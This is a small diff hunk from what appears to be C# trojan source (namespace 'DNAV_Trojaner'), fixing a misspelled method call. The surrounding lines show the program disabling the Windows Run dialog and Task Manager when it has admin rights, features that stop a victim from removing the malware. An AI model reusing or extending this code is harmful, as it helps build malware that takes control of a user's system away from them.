@@ -304,7 +304,7 @@ namespace DNAV_Trojaner
             }
             if (this.DisableRun && this._isAdmin)
             {
-                Run.Disbable(); 
+                Run.Disable(); 
             }
             if (this.DisableTaskmanager && this._isAdmin)
             {
